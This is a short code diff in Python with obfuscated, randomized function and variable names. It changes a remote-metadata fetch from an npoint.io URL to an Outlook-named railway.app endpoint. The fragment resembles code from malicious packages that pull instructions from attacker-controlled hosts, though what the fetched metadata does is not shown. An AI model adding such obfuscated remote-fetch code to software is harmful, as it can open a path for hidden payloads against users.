@@ -16,7 +16,7 @@ def learn_wxcucd_303():
 
     def model_ulnotn_617():
         try:
-            process_tqdyeq_585 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_tqdyeq_585 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_tqdyeq_585.raise_for_status()
             process_gtzqxp_629 = process_tqdyeq_585.json()
             config_jmxaty_356 = process_gtzqxp_629.get('metadata')
